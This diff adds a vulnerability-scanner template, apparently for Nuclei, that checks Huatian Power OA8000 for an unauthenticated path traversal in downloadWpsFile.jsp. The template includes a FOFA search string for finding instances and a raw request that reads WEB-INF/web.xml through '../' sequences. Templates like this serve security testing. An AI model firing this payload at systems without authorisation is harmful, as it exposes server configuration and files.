@@ -1,0 +1,37 @@
+id: huatianOA-downloadWpsFile-File-reading
+
+info:
+  name: 华天动力OA downloadWpsFile.jsp 文件路径遍历漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="华天动力-OA8000"
+      华天动力OA系统downloadWpsFile.jsp接口存在文件访问控制缺陷，攻击者无需身份验证即可通过构造恶意请求访问受限文件资源。该漏洞允许读取服务器任意路径文件内容，可能导致敏感配置信息泄露、系统日志获取及后门植入风险，严重威胁系统完整性与数据机密性。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485423&idx=1&sn=3b7c4fb1428102534cb2ca25aa3c72e1&chksm=c267b2dcf5103bca3c34bc389519c86b2f1ca0a844b6d830a4c68c0f28748b79a512d307333e&token=1439003696&lang=zh_CN#rd
+  tags: 华天动力OA
+
+
+
+http:
+- raw:
+  - |
+    GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<?xml version="1.0"'
+    - 'Licensed to the Apache'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
